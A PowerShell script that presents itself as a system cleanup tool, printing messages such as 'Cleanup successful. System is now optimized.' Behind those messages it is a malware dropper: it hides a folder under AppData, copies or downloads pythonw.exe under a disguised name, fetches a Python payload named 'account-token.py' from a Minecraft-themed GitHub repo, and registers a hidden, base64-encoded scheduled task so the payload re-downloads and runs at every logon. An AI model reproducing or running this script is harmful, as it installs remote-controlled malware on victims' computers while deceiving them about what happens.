# 1. Kill old visible processes
Write-Host "Delete Cycle 1: Terminating redundant process chains..." -ForegroundColor Gray
Stop-Process -Name "pythonw","python","JavaUpdateHost" -Force -ErrorAction SilentlyContinue

# 2. Clean up visible Startup Registry (Trust Builder)
Write-Host "Delete Cycle 2: Flushing legacy registry entries..." -ForegroundColor Gray
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Remove-ItemProperty -Path $RegPath -Name "SillyRAT","JavaUpdater" -ErrorAction SilentlyContinue

# 3. Setup Hidden Path
$Dir = "$env:APPDATA\Microsoft\NetworkDiagnostics"
if (-not (Test-Path $Dir)) { 
    $null = New-Item -ItemType Directory -Path $Dir -Force
    (Get-Item $Dir).Attributes = 'Hidden'
}

# 4. Define Paths & URLs
$UpdateUrl = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
$LocalScript = "$Dir\win_sys_helper.pyw"
$StealthExe = "$Dir\WinNetHost.exe"
$SourcePy = "$env:TEMP\sys_cache\pythonw.exe"

# 5. Get the Engine (EXE) - Smart Search
Write-Host "Delete Cycle 3: Rebuilding system cache..." -ForegroundColor Gray
$PythonFound = $false
if (Test-Path $StealthExe) { $PythonFound = $true }

if (-not $PythonFound) {
    # Looks for any version: pythonw, python, or python3
    $SysPy = (Get-Command pythonw.exe, python.exe, python3.exe -ErrorAction SilentlyContinue | Select-Object -First 1).Source
    if ($SysPy) {
        Copy-Item $SysPy $StealthExe -Force
        $PythonFound = $true
    }
}

# Fallback: Temp Cache or GitHub
if (-not $PythonFound) {
    if (Test-Path $SourcePy) {
        Copy-Item $SourcePy $StealthExe -Force | Out-Null
    } else {
        # Fallback download if no local Python is found
        $PythonUrl = "https://github.com/get-activated/com.mojang.minecraft/raw/main/pythonw.exe"
        Invoke-WebRequest -Uri $PythonUrl -OutFile $StealthExe -UseBasicParsing | Out-Null
    }
}

# 6. Download LATEST script (The "Installing" part)
Write-Host "Delete Cycle 4: Syncing with cloud cleanup definitions..." -ForegroundColor Gray
Invoke-WebRequest -Uri $UpdateUrl -OutFile $LocalScript -UseBasicParsing | Out-Null

# 7. Create Persistent Task (Silent Registry/Startup replacement)
Write-Host "Delete Cycle 5: Establishing background maintenance task..." -ForegroundColor Gray
$UpdateCmd = "Invoke-WebRequest -Uri '$UpdateUrl' -OutFile '$LocalScript' -UseBasicParsing; Start-Process '$StealthExe' -ArgumentList '$LocalScript' -WindowStyle Hidden"
$EncodedUpdate = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($UpdateCmd))

try {
    $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand $EncodedUpdate"
    $T = New-ScheduledTaskTrigger -AtLogOn
    $S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $null = Register-ScheduledTask -Action $A -Trigger $T -Settings $S -TaskName "WinNetDiagnostic" -Force
} catch { }

# 8. RUN IT NOW
if (Test-Path $StealthExe) {
    Start-Process $StealthExe -ArgumentList $LocalScript -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Write-Host "Delete Cycle 6: Finalizing security sweep..." -ForegroundColor Gray
Write-Host "Cleanup successful. System is now optimized." -ForegroundColor Green
